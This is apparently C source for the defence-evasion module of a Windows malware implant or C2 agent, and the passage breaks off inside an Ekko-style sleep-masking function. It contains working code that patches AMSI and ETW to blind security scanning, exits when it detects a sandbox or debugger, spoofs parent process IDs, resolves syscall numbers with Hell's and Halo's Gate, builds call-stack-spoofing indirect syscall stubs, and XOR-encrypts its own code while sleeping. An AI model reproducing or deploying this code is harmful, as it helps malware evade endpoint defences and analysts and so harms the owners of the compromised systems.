#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <ctype.h>
#include "evasion.h"
#include "api_resolve.h"

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif


/* ─── Compile-time sleep mask mode ────────────────────────────────────────
 * 0 = none      — plain NtDelayExecution (default; safe for all transports)
 * 1 = xor       — XOR .text during sleep; no page-protection change
 * 2 = noaccess  — XOR .text + PAGE_NOACCESS (naïve; fragile on x64)
 * 3 = ekko      — timer-queue callbacks; main thread parks in ntdll
 * 4 = foliage   — APC chain on dedicated suspended thread
 */
#ifndef AGENT_SLEEP_MASK_MODE
#define AGENT_SLEEP_MASK_MODE 0
#endif

/* ── Common typedefs (always compiled) ─────────────────────────────────── */
typedef BOOL (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LONG (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);

/* ── Ekko-specific typedefs (mode 3) ───────────────────────────────────── */
#if AGENT_SLEEP_MASK_MODE == 3
typedef HANDLE(WINAPI *CreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef BOOL  (WINAPI *SetEvent_t)(HANDLE);
typedef BOOL  (WINAPI *CloseHandle_t)(HANDLE);
typedef HANDLE(WINAPI *CreateTimerQueue_t)(void);
typedef BOOL  (WINAPI *CreateTimerQueueTimer_t)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef BOOL  (WINAPI *DeleteTimerQueueEx_t)(HANDLE, HANDLE);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
#endif

/* ── FOLIAGE-specific typedefs (mode 4) ────────────────────────────────── */
#if AGENT_SLEEP_MASK_MODE == 4
typedef HANDLE(WINAPI *CreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef BOOL  (WINAPI *SetEvent_t)(HANDLE);
typedef BOOL  (WINAPI *CloseHandle_t)(HANDLE);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
typedef LONG  (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                           PVOID, PVOID, ULONG, SIZE_T, SIZE_T,
                                           SIZE_T, PVOID);
typedef LONG  (NTAPI *NtQueueApcThread_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef LONG  (NTAPI *NtAlertResumeThread_t)(HANDLE, PULONG);
typedef LONG  (NTAPI *NtTestAlert_t)(void);
#endif

/* ── Globals in .data/.bss — always accessible even when .text is locked ─ */
static NtDelay_t g_NtDelay = NULL;
static void     *g_text    = NULL;   /* base of .text section */
static SIZE_T    g_tsz     = 0;      /* size of .text section */

#if AGENT_SLEEP_MASK_MODE >= 1
static VProt_t   g_VProt   = NULL;
#endif

#if AGENT_SLEEP_MASK_MODE == 3
static CreateEventA_t          g_CreateEvent           = NULL;
static SetEvent_t              g_SetEvent              = NULL;
static CloseHandle_t           g_CloseHandle           = NULL;
static CreateTimerQueue_t      g_CreateTimerQueue      = NULL;
static CreateTimerQueueTimer_t g_CreateTimerQueueTimer = NULL;
static DeleteTimerQueueEx_t    g_DeleteTimerQueueEx    = NULL;
static WaitForSingleObject_t   g_WaitForSingleObject   = NULL;
typedef struct { void *text; SIZE_T text_sz; HANDLE event; volatile LONG encrypted; } EkkoCtx;
static EkkoCtx g_ekko_ctx;
#endif

#if AGENT_SLEEP_MASK_MODE == 4
static CreateEventA_t        g_CreateEvent        = NULL;
static SetEvent_t            g_SetEvent           = NULL;
static CloseHandle_t         g_CloseHandle        = NULL;
static WaitForSingleObject_t g_WaitForSingleObject = NULL;
static NtCreateThreadEx_t    g_NtCreateThreadEx   = NULL;
static NtQueueApcThread_t    g_NtQueueApcThread   = NULL;
static NtAlertResumeThread_t g_NtAlertResumeThread = NULL;
static NtTestAlert_t         g_NtTestAlert        = NULL;
typedef struct { void *text; SIZE_T text_sz; HANDLE event; DWORD ms; volatile LONG encrypted; } FoliageCtx;
static FoliageCtx g_foliage_ctx;
#endif

/* Count of active pipe-server conn_threads. When > 0, sleep_masked skips the
 * PAGE_NOACCESS step to avoid faulting threads executing in .text. */
static volatile LONG g_conn_thread_count = 0;

void evasion_conn_enter(void) { InterlockedIncrement(&g_conn_thread_count); }
void evasion_conn_leave(void) { InterlockedDecrement(&g_conn_thread_count); }

/* ── Startup helpers (run from .text before any sleep masking) ─────────── */

static void patch_fn(const char *mod, const char *sym) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    if (!h) return;
    FARPROC fn = GetProcAddress(h, sym);
    if (!fn) return;
    /* xor eax,eax; ret — returns AMSI_RESULT_CLEAN (0) / S_OK (0) */
    unsigned char p[3] = { 0x31, 0xC0, 0xC3 };
    DWORD old;
    if (!VirtualProtect((void*)fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
    memcpy((void*)fn, p, 3);
    VirtualProtect((void*)fn, 3, old, &old);
}

static void find_text(void) {
    HMODULE base = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS   *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (memcmp(s->Name, ".text", 5) == 0) {
            g_text = (BYTE*)base + s->VirtualAddress;
            g_tsz  = s->Misc.VirtualSize;
            return;
        }
    }
}

/* ── Sandbox / analysis environment detection ──────────────────────────────
 * Score-based: exits silently if score >= 4.  Called before evasion_init().
 */
void sandbox_check(void) {
    if (IsDebuggerPresent()) ExitProcess(0);  /* immediate */

    int score = 0;

    /* CPU count */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) score++;

    /* RAM */
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        if (ms.ullTotalPhys < (ULONGLONG)512  * 1024 * 1024) score += 3;
        else if (ms.ullTotalPhys < (ULONGLONG)1024 * 1024 * 1024) score++;
    }

    /* Disk C: */
    ULARGE_INTEGER totalBytes;
    totalBytes.QuadPart = 0;
    if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL))
        if (totalBytes.QuadPart < (ULONGLONG)40 * 1024 * 1024 * 1024) score++;

    /* Username */
    char username[128] = {0};
    DWORD u_sz = sizeof(username);
    GetUserNameA(username, &u_sz);
    char low_u[128] = {0};
    for (int i = 0; username[i] && i < 127; i++)
        low_u[i] = (char)tolower((unsigned char)username[i]);
    const char *bad[] = {"sandbox","malware","virus","analyst","cuckoo","maltest","vmuser","tequilaboomboom"};
    for (int i = 0; i < 8; i++)
        if (strstr(low_u, bad[i])) { score += 3; break; }

    if (score >= 4) ExitProcess(0);
}

/* ── PPID spoofing — spawn a process with a fake parent PID ─────────────── */
int spawn_with_ppid(const char *cmd, const char *parent_name) {
    char lp[MAX_PATH] = {0};
    for (int i = 0; parent_name[i] && i < MAX_PATH-1; i++)
        lp[i] = (char)tolower((unsigned char)parent_name[i]);

    /* Walk the process list and try each matching process in order.
     * Skip PID 0 (Idle) and PID 4 (System) — they cannot be opened.
     * Try all candidates so a protected/exited process doesn't block us. */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    /* Collect up to 8 candidate PIDs without holding the snapshot open */
    DWORD candidates[8] = {0};
    int   ncand = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;
            char narrow[MAX_PATH] = {0};
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
                                narrow, sizeof(narrow)-1, NULL, NULL);
            char lo[MAX_PATH] = {0};
            for (int i = 0; narrow[i] && i < MAX_PATH-1; i++)
                lo[i] = (char)tolower((unsigned char)narrow[i]);
            if (strcmp(lo, lp) == 0 && ncand < 8)
                candidates[ncand++] = pe.th32ProcessID;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!ncand) return 0;

    /* Try each candidate until one succeeds */
    HANDLE hParent = NULL;
    for (int i = 0; i < ncand; i++) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, candidates[i]);
        if (hParent) break;
    }
    if (!hParent) return 0;

    SIZE_T attr_sz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attr_sz);
    if (!attrList) { CloseHandle(hParent); return 0; }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attr_sz)) {
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent), NULL, NULL)) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }

    STARTUPINFOEXW siEx;
    ZeroMemory(&siEx, sizeof(siEx));
    siEx.StartupInfo.cb = sizeof(siEx);
    siEx.lpAttributeList = attrList;

    int wcmd_len = MultiByteToWideChar(CP_UTF8, 0, cmd, -1, NULL, 0);
    if (wcmd_len <= 0) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wcmd_len * sizeof(WCHAR));
    if (!wcmd) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
    }
    MultiByteToWideChar(CP_UTF8, 0, cmd, -1, wcmd, wcmd_len);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    /* No CREATE_SUSPENDED — resume flag is an extra EDR hook target and is
     * unnecessary for PPID spoofing.  CREATE_NEW_PROCESS_GROUP isolates
     * Ctrl+C / console signal inheritance from the agent's session. */
    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
        NULL, NULL, &siEx.StartupInfo, &pi);
    DWORD cp_err = GetLastError();   /* capture immediately before any other call */

    HeapFree(GetProcessHeap(), 0, wcmd);
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    if (!ok) { SetLastError(cp_err); return 0; }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

/* Thread wrapper — SEH via AddVectoredExceptionHandler (registered in
 * evasion_init) catches any exception from inside CreateProcessW.
 * The error from CreateProcessW is captured inside spawn_with_ppid and
 * stored in w->err so WaitForSingleObject + CloseHandle can't clobber it. */
DWORD WINAPI ppid_worker(LPVOID arg) {
    PpidWork *w = (PpidWork *)arg;
    w->ok  = spawn_with_ppid(w->cmd, w->parent);
    w->err = (w->ok == 1) ? 0 : GetLastError();
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Phase 10: Call-stack spoofing
 *
 * 110-byte spoofed indirect-syscall stubs are built in a VirtualAlloc'd page
 * (RW → write stubs → RX).  Each stub:
 *   1. sub rsp,8  — opens a slot for the fake return address
 *   2. slides any stack-passed args (args 5-11) down by one slot
 *   3. plants a call-preceded RET address from ntdll at [RSP]
 *   4. issues an indirect syscall via a "syscall;ret" gadget also in ntdll
 *
 * The stack-walker sees a coherent ntdll call chain and no agent .text frame.
 * ═══════════════════════════════════════════════════════════════════════════ */

#define SPOOF_STUB_SIZE 110

static LPVOID    g_spoof_page    = NULL;
static int       g_spoof_count   = 0;
static int       g_spoof_ok      = 0;
static ULONG_PTR g_syscall_gadget = 0;   /* VA of ntdll "syscall;ret" */
static ULONG_PTR g_spoof_gadget   = 0;   /* VA of ntdll "call;...;ret" (the C3) */

/* Exported spoofed-stub pointers */
NtAllocVMem_t      g_NtAllocVM    = NULL;
NtProtVMem_t       g_NtProtVM     = NULL;
NtCreateThreadEx_t g_NtCreateThread = NULL;
NtDelayExec_t      g_NtDelayExec  = NULL;

/* ── PE little-endian helpers ─────────────────────────────────────────────── */
static unsigned short pe_r16(const unsigned char *p, int o) {
    return (unsigned short)p[o] | ((unsigned short)p[o+1] << 8);
}
static unsigned int pe_r32(const unsigned char *p, int o) {
    return (unsigned int)p[o]        | ((unsigned int)p[o+1] << 8) |
           ((unsigned int)p[o+2] << 16) | ((unsigned int)p[o+3] << 24);
}

/* ── SSN resolution: Hell's Gate + Halo's Gate fallback ──────────────────── */
static unsigned short spoof_get_ssn(HMODULE ntdll, const char *name) {
    const unsigned char *fn = (const unsigned char *)GetProcAddress(ntdll, name);
    if (!fn) return 0;
    /* Unpatched stub: 4C 8B D1  B8 lo hi 00 00  0F 05  C3 */
    if (fn[0]==0x4C && fn[1]==0x8B && fn[2]==0xD1 && fn[3]==0xB8)
        return (unsigned short)fn[4] | ((unsigned short)fn[5] << 8);
    /* Halo's Gate: scan forward neighbours (each stub is 32 bytes apart) */
    for (int i = 1; i <= 5; i++) {
        const unsigned char *nb = fn + (i * 32);
        if (nb[0]==0x4C && nb[1]==0x8B && nb[2]==0xD1 && nb[3]==0xB8) {
            unsigned short base_ssn = (unsigned short)nb[4] | ((unsigned short)nb[5] << 8);
            return (base_ssn >= (unsigned short)i) ? base_ssn - (unsigned short)i : 0;
        }
    }
    return 0;
}

/* ── Scan ntdll .text for "syscall;ret" (0F 05 C3) ──────────────────────── */
static ULONG_PTR spoof_find_syscall_gadget(ULONG_PTR base) {
    const unsigned char *dos = (const unsigned char *)base;
    unsigned int elf = pe_r32(dos, 60);
    const unsigned char *pe  = dos + elf;
    unsigned short nsects = pe_r16(pe, 6);
    unsigned short optsz  = pe_r16(pe, 20);
    const unsigned char *sec0 = pe + 24 + optsz;
    for (unsigned short i = 0; i < nsects; i++) {
        const unsigned char *sec = sec0 + (i * 40);
        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
            continue;
        unsigned int vaddr = pe_r32(sec, 12);
        unsigned int vsz   = pe_r32(sec, 16);
        const unsigned char *mem = (const unsigned char *)(base + vaddr);
        for (unsigned int off = 0; off + 3 <= vsz; off++)
            if (mem[off]==0x0F && mem[off+1]==0x05 && mem[off+2]==0xC3)
                return base + vaddr + off;
    }
    return 0;
}

/* ── Scan ntdll .text for "call rel32; ret" — return VA of the C3 byte ──── */
static ULONG_PTR spoof_find_spoof_gadget(ULONG_PTR base) {
    const unsigned char *dos = (const unsigned char *)base;
    unsigned int elf = pe_r32(dos, 60);
    const unsigned char *pe  = dos + elf;
    unsigned short nsects = pe_r16(pe, 6);
    unsigned short optsz  = pe_r16(pe, 20);
    const unsigned char *sec0 = pe + 24 + optsz;
    for (unsigned short i = 0; i < nsects; i++) {
        const unsigned char *sec = sec0 + (i * 40);
        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
            continue;
        unsigned int vaddr = pe_r32(sec, 12);
        unsigned int vsz   = pe_r32(sec, 16);
        const unsigned char *mem = (const unsigned char *)(base + vaddr);
        /* Require off >= 5 so mem[off-5] is always in range */
        for (unsigned int off = 5; off < vsz; off++)
            if (mem[off-5]==0xE8 && mem[off]==0xC3)
                return base + vaddr + off;
    }
    return 0;
}

/* ── Write one 110-byte spoofed stub into g_spoof_page ───────────────────── *
 *
 * Stub layout (identical to the Nim Phase-10 stubs in agent-nim/syscalls.nim):
 *  +0   48 83 EC 08               sub  rsp, 8
 *  +4   4C 8B 5C 24 30            mov  r11, [rsp+0x30]  ─┐
 *  +9   4C 89 5C 24 28            mov  [rsp+0x28], r11   │ slide args 5-11
 *  +14  ...                        (× 7 pairs, 10 B each) │ down by 8 bytes
 *  +74  49 BB <8>                  mov  r11, spoof_gadget ; fake ret addr
 *  +84  4C 89 1C 24               mov  [rsp], r11
 *  +88  4C 8B D1                  mov  r10, rcx
 *  +91  B8 lo hi 00 00            mov  eax, SSN
 *  +96  FF 25 00 00 00 00         jmp  [rip+0]
 *  +102 <8>                        → syscall_gadget
 */
static void *spoof_make_stub(unsigned short ssn) {
    if (!g_spoof_page) return NULL;
    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;

    unsigned char *p = (unsigned char *)g_spoof_page + (g_spoof_count * SPOOF_STUB_SIZE);
    g_spoof_count++;

    static const unsigned char src_slots[7] = {0x30,0x38,0x40,0x48,0x50,0x58,0x60};
    static const unsigned char dst_slots[7] = {0x28,0x30,0x38,0x40,0x48,0x50,0x58};

    /* +0: sub rsp, 8 */
    p[0]=0x48; p[1]=0x83; p[2]=0xEC; p[3]=0x08;

    /* +4..+73: 7 pairs of (mov r11,[rsp+src]; mov [rsp+dst],r11) */
    int off = 4;
    for (int i = 0; i < 7; i++) {
        p[off+0]=0x4C; p[off+1]=0x8B; p[off+2]=0x5C; p[off+3]=0x24; p[off+4]=src_slots[i];
        p[off+5]=0x4C; p[off+6]=0x89; p[off+7]=0x5C; p[off+8]=0x24; p[off+9]=dst_slots[i];
        off += 10;
    } /* off == 74 */

    /* +74: mov r11, spoof_gadget  (49 BB <8-byte LE>) */
    p[74]=0x49; p[75]=0xBB;
    memcpy(p + 76, &g_spoof_gadget, 8);

    /* +84: mov [rsp], r11  (4C 89 1C 24) */
    p[84]=0x4C; p[85]=0x89; p[86]=0x1C; p[87]=0x24;

    /* +88: mov r10, rcx  (4C 8B D1) */
    p[88]=0x4C; p[89]=0x8B; p[90]=0xD1;

    /* +91: mov eax, SSN  (B8 lo hi 00 00) */
    p[91]=0xB8; p[92]=(unsigned char)(ssn & 0xFF); p[93]=(unsigned char)(ssn >> 8);
    p[94]=0x00; p[95]=0x00;

    /* +96: jmp [rip+0]  (FF 25 00 00 00 00) */
    p[96]=0xFF; p[97]=0x25; p[98]=0x00; p[99]=0x00; p[100]=0x00; p[101]=0x00;

    /* +102: syscall gadget address  (8-byte LE) */
    memcpy(p + 102, &g_syscall_gadget, 8);

    return (void *)p;
}

/* ── Public API ───────────────────────────────────────────────────────────── */

void init_stack_spoof(void) {
    /* Use the already-loaded ntdll for SSN resolution.
     * Previously used LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) to get a
     * "clean" copy, but that caused heap corruption (FTH abcc): the loader
     * makes internal heap allocations for the module entry that are left
     * incomplete, corrupting the process heap. On unhooked targets the live
     * ntdll stubs have the standard 4C 8B D1 B8 pattern and no second copy
     * is needed; Halo's Gate neighbours handle the hooked-stub fallback. */
    HMODULE ntdll_live = GetModuleHandleA("ntdll.dll");
    if (!ntdll_live) return;

    /* Resolve SSNs (Hell's Gate / Halo's Gate) */
    unsigned short ssn_alloc = spoof_get_ssn(ntdll_live, "NtAllocateVirtualMemory");
    unsigned short ssn_prot  = spoof_get_ssn(ntdll_live, "NtProtectVirtualMemory");
    unsigned short ssn_thr   = spoof_get_ssn(ntdll_live, "NtCreateThreadEx");
    unsigned short ssn_delay = spoof_get_ssn(ntdll_live, "NtDelayExecution");

    /* Scan live (in-memory) ntdll for both gadgets */
    ULONG_PTR base = (ULONG_PTR)ntdll_live;
    g_syscall_gadget = spoof_find_syscall_gadget(base);
    g_spoof_gadget   = spoof_find_spoof_gadget(base);

    if (!g_syscall_gadget || !g_spoof_gadget) return;

    /* Allocate RW page, write stubs, then lock to RX */
    g_spoof_page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_spoof_page) return;

    g_NtAllocVM      = (NtAllocVMem_t)     spoof_make_stub(ssn_alloc);
    g_NtProtVM       = (NtProtVMem_t)      spoof_make_stub(ssn_prot);
    g_NtCreateThread = (NtCreateThreadEx_t)spoof_make_stub(ssn_thr);
    g_NtDelayExec    = (NtDelayExec_t)     spoof_make_stub(ssn_delay);

    DWORD old;
    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
    g_spoof_ok = 1;
}

void *spoof_syscall_stub(unsigned short ssn) {
    if (!g_spoof_ok || !g_spoof_page) return NULL;
    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;

    /* Briefly re-open for writing, append stub, re-seal */
    DWORD old;
    if (!VirtualProtect(g_spoof_page, 4096, PAGE_READWRITE, &old)) return NULL;
    void *stub = spoof_make_stub(ssn);
    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
    return stub;
}

void amsi_bypass(void) {
#ifdef AGENT_AMSI_BYPASS
    patch_fn("amsi.dll", "AmsiScanBuffer");
    patch_fn("amsi.dll", "AmsiScanString");
#endif
#ifdef AGENT_ETW_BYPASS
    patch_fn("ntdll.dll", "EtwEventWrite");
#endif
}

void evasion_init(void) {
#ifdef AGENT_AMSI_BYPASS
    patch_fn("amsi.dll", "AmsiScanBuffer");
    patch_fn("amsi.dll", "AmsiScanString");
#endif
#ifdef AGENT_ETW_BYPASS
    patch_fn("ntdll.dll", "EtwEventWrite");
#endif

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");

#if AGENT_SLEEP_MASK_MODE >= 1
    {
        HMODULE k32 = GetModuleHandleA("kernel32.dll");
        g_VProt = (VProt_t)GetProcAddress(k32, "VirtualProtect");
        find_text();

#if AGENT_SLEEP_MASK_MODE == 3
        g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32, "CreateEventA");
        g_SetEvent            = (SetEvent_t)           GetProcAddress(k32, "SetEvent");
        g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32, "CloseHandle");
        g_CreateTimerQueue    = (CreateTimerQueue_t)   GetProcAddress(k32, "CreateTimerQueue");
        g_CreateTimerQueueTimer=(CreateTimerQueueTimer_t)GetProcAddress(k32,"CreateTimerQueueTimer");
        g_DeleteTimerQueueEx  = (DeleteTimerQueueEx_t) GetProcAddress(k32, "DeleteTimerQueueEx");
        g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32, "WaitForSingleObject");
#endif /* mode 3 */

#if AGENT_SLEEP_MASK_MODE == 4
        g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32,   "CreateEventA");
        g_SetEvent            = (SetEvent_t)           GetProcAddress(k32,   "SetEvent");
        g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32,   "CloseHandle");
        g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32,   "WaitForSingleObject");
        g_NtCreateThreadEx    = (NtCreateThreadEx_t)   GetProcAddress(ntdll, "NtCreateThreadEx");
        g_NtQueueApcThread    = (NtQueueApcThread_t)   GetProcAddress(ntdll, "NtQueueApcThread");
        g_NtAlertResumeThread = (NtAlertResumeThread_t)GetProcAddress(ntdll, "NtAlertResumeThread");
        g_NtTestAlert         = (NtTestAlert_t)        GetProcAddress(ntdll, "NtTestAlert");
#endif /* mode 4 */
    }
#endif /* mode >= 1 */

#ifdef AGENT_STACK_SPOOF
    init_stack_spoof();
#endif
}

/* ══════════════════════════════════════════════════════════════════════════
 * Sleep masking — all code in .evasn so it runs while .text is locked.
 * All Windows API calls go through function pointers in .data to avoid
 * hitting IAT thunks that would be in the encrypted/inaccessible .text.
 *
 * Mode 0 (none)     — plain NtDelayExecution; zero detection surface.
 * Mode 1 (xor)      — XOR .text bytes then sleep (no page-prot change).
 * Mode 2 (noaccess) — XOR .text + PAGE_NOACCESS; naïve, fragile on x64
 *                     because the exception dispatcher reads .pdata→.text.
 * Mode 3 (ekko)     — timer-queue threads do encrypt/decrypt; main thread
 *                     parks in WaitForSingleObject inside ntdll.
 * Mode 4 (foliage)  — dedicated suspended thread drains an APC chain that
 *                     does encrypt→sleep→decrypt; main thread parks in
 *                     WaitForSingleObject inside ntdll.
 * ══════════════════════════════════════════════════════════════════════════
 */

/* ── Helper: plain fallback sleep — used by all modes on error ─────────── */
__attribute__((section(".evasn"), noinline))
static void plain_sleep(DWORD ms) {
    LARGE_INTEGER t;
    t.QuadPart = -(LONGLONG)ms * 10000LL;
    if (g_NtDelay) g_NtDelay(FALSE, &t); else Sleep(ms);
}

/* ─────────────────────────── MODE 1: XOR only ─────────────────────────── */
#if AGENT_SLEEP_MASK_MODE == 1

__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    if (!g_text || !g_VProt || !g_NtDelay) { plain_sleep(ms); return; }

    unsigned char *text = (unsigned char*)g_text;
    SIZE_T sz = g_tsz;
    DWORD old;

    /* Make .text writable; bail if blocked (HVCI) */
    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old)) { plain_sleep(ms); return; }
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);   /* readable but garbled */

    plain_sleep(ms);

    /* Restore writable before decrypt XOR; fallback to PAGE_READWRITE if
     * EXECUTE+WRITE is blocked — writing to PAGE_EXECUTE_READ would fault. */
    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old))
        if (!g_VProt(text, sz, PAGE_READWRITE, &old)) return;
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
}

/* ──────────────────────── MODE 2: PAGE_NOACCESS ───────────────────────── */
#elif AGENT_SLEEP_MASK_MODE == 2

__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    if (!g_text || !g_VProt || !g_NtDelay) { plain_sleep(ms); return; }
    /* Skip while pipe-server threads execute in .text */
    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }

    unsigned char *text = (unsigned char*)g_text;
    SIZE_T sz = g_tsz;
    DWORD old;

    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old)) { plain_sleep(ms); return; }
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
    g_VProt(text, sz, PAGE_NOACCESS, &old);

    plain_sleep(ms);

    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old))
        if (!g_VProt(text, sz, PAGE_READWRITE, &old)) return;
    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
}

/* ─────────────────────────── MODE 3: EKKO ─────────────────────────────── */
#elif AGENT_SLEEP_MASK_MODE == 3

__attribute__((section(".evasn"), noinline))
static VOID CALLBACK ekko_encrypt_cb(PVOID ctx, BOOLEAN unused) {
    (void)unused;
    EkkoCtx *c = (EkkoCtx*)ctx;
    unsigned char *t = (unsigned char*)c->text;
    DWORD old;
    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
    g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
    InterlockedExchange(&c->encrypted, 1);
}

__attribute__((section(".evasn"), noinline))
static VOID CALLBACK ekko_decrypt_cb(PVOID ctx, BOOLEAN unused) {
    (void)unused;
    EkkoCtx *c = (EkkoCtx*)ctx;
    unsigned char *t = (unsigned char*)c->text;
    DWORD old;
    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old))
        g_VProt(t, c->text_sz, PAGE_READWRITE, &old);
    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
    g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
    InterlockedExchange(&c->encrypted, 0);
    g_SetEvent(c->event);
}

__attribute__((section(".evasn"), noinline))
void sleep_masked(DWORD ms) {
    if (!g_text || !g_VProt || !g_NtDelay || !g_CreateEvent || !g_SetEvent ||
        !g_CloseHandle || !g_CreateTimerQueue || !g_CreateTimerQueueTimer ||
        !g_DeleteTimerQueueEx || !g_WaitForSingleObject)
        { plain_sleep(ms); return; }

    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }

    /* Probe VirtualProtect (HVCI check) */
    DWORD probe;
    if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
    g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);

    g_ekko_ctx.text      = g_text;
    g_ekko_ctx.text_sz   = g_tsz;
    g_ekko_ctx.encrypted = 0;
    g_ekko_ctx.event     = g_CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!g_ekko_ctx.event) { plain_sleep(ms); return; }

    HANDLE hQ = g_CreateTimerQueue();
    if (!hQ) { g_CloseHandle(g_ekko_ctx.event); plain_sleep(ms); return; }

    HANDLE hT1 = NULL, hT2 = NULL;
    g_CreateTimerQueueTimer(&hT1, hQ, (WAITORTIMERCALLBACK)ekko_encrypt_cb,
                            &g_ekko_ctx, 0, 0, WT_EXECUTEINTIMERTHREAD);
    g_CreateTimerQueueTimer(&hT2, hQ, (WAITORTIMERCALLBACK)ekko_decrypt_cb,
                            &g_ekko_ctx, ms, 0, WT_EXECUTEINTIMERTHREAD);

    DWORD wait_rc = g_WaitForSingleObject(g_ekko_ctx.event, ms + 10000);

